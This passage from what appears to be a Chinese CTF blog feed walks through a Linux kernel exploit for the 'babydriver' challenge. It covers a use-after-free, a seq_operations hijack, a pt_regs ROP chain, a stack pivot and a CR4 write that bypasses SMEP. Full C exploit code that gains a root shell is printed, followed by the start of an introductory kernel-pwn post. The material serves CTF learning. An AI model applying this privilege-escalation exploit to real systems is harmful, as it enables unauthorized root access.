class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>所以如果我们提前先用汇编赋值各个寄存器的值，那么在syscall调用下陷到内核态时，内核栈底就会有我们提前布置的值，从而有可能劫持程序控制流，执行我们的rop链。</p>
<h4 id="seq_operations搭配pt_regs">seq_operations搭配pt_regs</h4>
<p>一般来说，我们可以把<strong>seq_operations-&gt;start</strong>改成一个gadget。一般而言是打开一个<code>/proc/self/stat</code>文件，然后利用漏洞改其中的值，然后用read方法读这个文件就能触发<strong>start</strong>函数指针，也就是执行我们的gadget。这个gadget形如<code>add rsp,xxx;pop*n;ret</code>，这种gadget能够使rsp抬高接近内核栈底，也就能够有机会降落到我们可以提前布置的rop链上。想要准确定位就要进行动态调试，为了更方便观察最后要改哪个值，我们可以用如下的这个板子。这样我们在调试时就能清晰看到哪个栈上的值对应我们的哪个寄存器了。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax,   rax;&quot;</span>			<span class="comment">// 走read系统调用</span></span><br><span class="line">    <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
<h4 id="例题babydriver">例题：babydriver</h4>
<p>init文件内容如下，都是一些常规的内容，我们可以把<strong>setuidgid</strong>后面的内容改为0从而以root用户启动方便调试：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"><span class="built_in">chown</span> root:root flag</span><br><span class="line"><span class="built_in">chmod</span> 400 flag</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line"><span class="built_in">chmod</span> 777 /dev/babydev</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure></div>
<p>boot.sh文件内容如下，发现没开kaslr和kpti，开启了smep保护。这种情况其实我们可以通过改<strong>cr4</strong>寄存器来绕过<strong>smep</strong>，然后直接ret2usr：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -m 128M \</span><br><span class="line">    --nographic  \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -s</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>现在我们看具有漏洞的模块babydriver.ko：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316175038321.png"
                      class=""
                >
<p>初始化函数注册了<strong>babydev</strong>设备。然后有orw以及ioctl控制函数。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316183004702.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316202313963.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316175332875.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316175344843.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316175259465.png"
                      class=""
                >
<p>这里我们发现<strong>babydev_struct</strong>是一个全局变量，即使我们打开多个设备文件，它们IO所用到的结构体都是一样的。这里的ioctl函数能够改变我们<strong>babydev_struct</strong>的大小，其内存是正常管理的，先free掉原来的结构体中的<strong>device_buf</strong>，然后又申请回来我们指定大小的<strong>buf</strong>，这里<strong>kmalloc</strong>的v4参数经过动调能发现是我们用户态调用<strong>ioctl</strong>的第三个参数（其实也可以从上面v4=v3，而v3又指向rdx看出来）。</p>
<p>比如我们如果<strong>ioctl</strong>第三个参数设置为<strong>0x20</strong>，然后里面kmalloc就是申请<strong>0x20</strong>大小的内存。kmalloc这里第二个参数是标志位。</p>
<p>相关的 <code>GFP</code> 标志定义在
<code>include/linux/gfp.h</code>，其中：</p>
<ul>
<li><code>GFP_KERNEL</code> = <code>0xC0</code>
<ul>
<li>允许进程 <strong>休眠等待内存</strong>（如果当前不可用）。</li>
<li>适用于 <strong>非中断上下文</strong>，如 <code>ioctl()</code>
处理程序。</li>
</ul></li>
<li><code>__GFP_ZERO</code> = <code>0x80</code>
<ul>
<li><strong>分配的内存全部初始化为 0</strong>，防止数据泄露。</li>
</ul></li>
<li><code>__GFP_COMP</code> = <code>0x4000</code>
<ul>
<li>允许返回 <strong>大块连续物理内存</strong>（用于
<code>kmalloc()</code> 以外的特殊情况）。</li>
</ul></li>
<li><code>__GFP_NOWARN</code> = <code>0x2000000</code>
<ul>
<li><strong>分配失败时不打印警告信息</strong>，避免系统日志污染。</li>
</ul></li>
</ul>
<p>所以：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x24000C0</span> = GFP_KERNEL | __GFP_ZERO | __GFP_COMP | __GFP_NOWARN</span><br></pre></td></tr></table></figure></div>
<p>这意味着：</p>
<ol type="1">
<li>允许进程休眠等待内存（<code>GFP_KERNEL</code>）。</li>
<li>分配的内存自动清零（<code>__GFP_ZERO</code>）。</li>
<li>分配 <strong>可能大于
4KB</strong>，甚至跨多个页（<code>__GFP_COMP</code>）。</li>
<li>失败时不打印 <code>warn</code>（<code>__GFP_NOWARN</code>）。</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316203013896.png"
                      class=""
                >
<p>而在关闭设备文件时会调用的<strong>babyrelease</strong>就存在一个纯粹的UAF，我们那么就可以先创建逻辑上重叠的两个设备（因为其全局变量是共享的），然后用<strong>ioctl</strong>中的函数将<strong>babydev_struct</strong>的size改为0x20。那么之后我们如果再打开一个<code>/proc/self/stat</code>文件，由于申请的<strong>seq_operations</strong>结构体大小为0x20，kmalloc的规则又和fastbin堆块的分配有类似之处，都是从链表中取值，而且服从后入先出。那么我们的<strong>seq_operations</strong>结构体就会分配在原来我们释放的内存之上。这时候我们就可以用之前打开的另一个设备，使用<strong>write</strong>调用内核模块的<strong>babywrite</strong>函数，之后就可以改写<strong>seq_operations</strong>的各个字段了。这里我们只需要改<strong>seq_operations-&gt;start</strong>，那么就可以在对这个<strong>stat</strong>文件进行读操作时触发我们的payload，从而劫持程序执行流。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316210152717.png"
                      class=""
                >
<p>然后问题就来到了如何构造payload，先用如下exp进去动调看看：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel  -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushf;&quot;</span></span><br><span class="line">			<span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff81e48c60</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="type">size_t</span> gadget = <span class="number">0xffffffff8123105a</span>;             <span class="comment">// add rsp, 0x108; pop rbx; pop rbp; ret;</span></span><br><span class="line"><span class="type">size_t</span> swapgs_pop_rbp_ret = <span class="number">0xffffffff81063694</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="type">size_t</span> mov_cr4_ret = <span class="number">0xffffffff81004d80</span>;            <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> temp_buf[<span class="number">4</span>];</span><br><span class="line"><span class="type">size_t</span> fake_stack[<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*cc)(<span class="type">void</span>*) = commit_creds; </span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x20</span>);				</span><br><span class="line">	close(fd1);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>,O_RDWR);</span><br><span class="line"></span><br><span class="line">    write(fd2,&amp;gadget,<span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里调试时需注意，我是打断点到<strong>babywrite</strong>然后一直执行恢复到用户态，在sysqret处会直接导致崩溃退出，但我们如果在<code>write(fd2,&amp;gadget,8);</code>后面写其它语句其实还是会执行的，这说明这个情况下gdb无法通过<strong>sysretq</strong>跟踪回用户态。那我们只能直接在用户态空间打断点再进行跳转。不过更好的选择是直接打断点到<strong>sys_read</strong>，因为我们最后是用read的系统调用触发伪造的<strong>start</strong>函数指针的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316215453186.png"
                      class=""
                >
<p>之后跟着<code>sys_read-&gt;vfs_read-&gt;__vfs_read-&gt;seq_read</code>走，最后到了一个位置会执行我们的写入<strong>start</strong>域的<strong>gadget</strong>，这时候我们可以观察最后更改rsp之后最后会ret到哪里，然后把对应模板的内容改成实际的rop链。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316220141013.png"
                      class=""
                >
<p>这里很可惜返回到的位置是8，也就是我们一开始的rdx的位置，而rdx我们需要正常使用，所以我们需要改变gadget，使最后能到连续的未被改变的寄存器的位置。比如底下的0x55555555，0x33333333，0x22222222等这么一段连续的位置布置rop链。比如现在<code>add rsp,0x108</code>加两个pop不行，那我想最后返回到0x55555555的位置，就需要找刚好可以到那个位置的gadget，其实也可以利用中间散的一些可控制的位置来换成<code>add rsp</code>较小的值这样的第二个gadget，这样会比较好凑。比如我还有个gadget1能<code>add rsp,0x108;pop;pop;pop</code>，那么刚好可以返回到<strong>0xbeefdead</strong>处，也就是我们要在r15处布置下一个改rsp的gadget，比如说<code>add rsp,0x10</code>加上3个pop，这个很容易找到。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316220439678.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316222735493.png"
                      class=""
                >
<p>但即使用了这个技巧，在这题环境下我也只能连续控制5个rop，而我们需要完成提权操作一般需要的rop长度较长。由于这题没开smap，我们所以可以考虑在用户态布置完整rop链，然后自定义一个缓冲区全局变量，记录其起始地址，并将其配合<code>pop_rax_ret</code>以及<code>mov_rsp_rax_ret;</code>之类的gadget实现栈迁移。然后就能执行任意长的rop链了。这里<code>mov_rsp_rax_ret;</code>这个gadget直接用ropper找我居然找不到，参考网上的一些exp，最后在vmlinux中自己定位找到了是存在<strong>error_entry</strong>函数末尾的部分。可能是因为有个跳转到retn的原因所以识别不出来。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316230259316.png"
                      class=""
                >
<p>最终exp如下，这里最后以经能执行我们的rop链提权了，但是最后还是会爆<strong>Segmentation
fault</strong>，可能是一些寄存器被修改了的关系，但这并不影响我们获取shell，因为可以利用异常机制来捕获<strong>Segmentation
fault</strong>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel  -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushf;&quot;</span></span><br><span class="line">			<span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff81e48c60</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="type">size_t</span> gadget = <span class="number">0xffffffff816d749b</span>;          <span class="comment">// add rsp, 0x108; pop rbx; pop r12; pop rbp; ret;</span></span><br><span class="line"><span class="type">size_t</span> gadget2 = <span class="number">0xffffffff81003f6f</span>;         <span class="comment">//add rsp, 0x10; pop rbx; pop r12; pop rbp; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rax_ret = <span class="number">0xffffffff8100ce6e</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rsp_rax_ret = <span class="number">0xffffffff8181BFC5</span>;        </span><br><span class="line"><span class="type">size_t</span> swapgs_pop_rbp_ret = <span class="number">0xffffffff81063694</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="type">size_t</span> mov_cr4_ret = <span class="number">0xffffffff81004d80</span>;            <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line"><span class="type">size_t</span> fake_stack[<span class="number">20</span>];</span><br><span class="line"><span class="type">size_t</span> fake_stack_addr = &amp;fake_stack;</span><br><span class="line"><span class="type">size_t</span> temp_buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*cc)(<span class="type">void</span>*) = commit_creds; </span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_stack_addr: 0x%llx\n&quot;</span>,fake_stack_addr);</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x20</span>);				</span><br><span class="line">	close(fd1);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    write(fd2,&amp;gadget,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    fake_stack[<span class="number">0</span>] = pop_rdi_ret;</span><br><span class="line">    fake_stack[<span class="number">1</span>] = <span class="number">0x6f0</span>;</span><br><span class="line">    fake_stack[<span class="number">2</span>] = mov_cr4_ret;</span><br><span class="line">    fake_stack[<span class="number">3</span>] = <span class="number">0xffff</span>;         <span class="comment">// rbp, padding</span></span><br><span class="line">    fake_stack[<span class="number">4</span>] = get_root;</span><br><span class="line">    fake_stack[<span class="number">5</span>] = swapgs_pop_rbp_ret;</span><br><span class="line">    fake_stack[<span class="number">6</span>] = <span class="number">0xffff</span>;         <span class="comment">// rbp, padding</span></span><br><span class="line">    fake_stack[<span class="number">7</span>] = iretq;</span><br><span class="line">    fake_stack[<span class="number">8</span>] = get_shell;</span><br><span class="line">    fake_stack[<span class="number">9</span>] = user_cs;</span><br><span class="line">    fake_stack[<span class="number">10</span>] = user_rflags;</span><br><span class="line">    fake_stack[<span class="number">11</span>] = user_sp;</span><br><span class="line">    fake_stack[<span class="number">12</span>] =  user_ss;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   gadget2;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span>                    </span><br><span class="line">        <span class="string">&quot;mov r13,   mov_rsp_rax_ret;&quot;</span>                  <span class="comment">//0x22222222,3</span></span><br><span class="line">        <span class="string">&quot;mov r12,   fake_stack_addr;&quot;</span>                  <span class="comment">//0x33333333,2</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   pop_rax_ret;&quot;</span>       <span class="comment">//0x55555555,1</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>成功提权！</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/16/seq-operations%E6%90%AD%E9%85%8Dpt-regs%E7%9A%84kernel%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/image-20250316233323066.png"
                      class=""
                >
<p>参考资料：</p>
<ul>
<li>https://blingblingxuanxuan.github.io/2023/01/10/23-01-10-kernel-pwn-useful-struct/</li>
<li>https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2ptregs/</li>
<li>https://blog.csdn.net/qq_61670993/article/details/133414825</li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>kernel pwn初探</title>
    <url>/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h2 id="kernel-pwn初探">kernel pwn初探</h2>
<h4 id="基础知识">基础知识</h4>
<p>基础的概念入门时不宜死磕，最好粗略看看留个印象，然后下去环境配好后，在调试探索时逐步深化理解。</p>
<h5 id="如何理解内核">如何理解内核</h5>
<p>操作系统内核（Operation System
Kernel）本质上也是一种软件，可以看作是普通应用程式与硬件之间的一层中间层，其主要作用便是调度系统资源、控制
IO
设备、操作网络与文件系统等，并为上层应用提供便捷、抽象的应用接口。操作系统内核实际上是我们抽象出来的一个概念，本质上与用户进程一般无二，都是位于物理内存中的代码
+ 数据，不同之处在于当 CPU
执行操作系统内核代码时通常运行在高权限，拥有着完全的硬件访问能力，而 CPU
在执行用户态代码时通常运行在低权限环境，只拥有部分 /
缺失硬件访问能力。</p>
<h5 id="分级保护域"><strong>分级保护域</strong></h5>
<p>分级保护域（hierarchical protection domains）又被称作保护环，简称
Rings ，是一种将计算机不同的资源划分至不同权限的模型。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
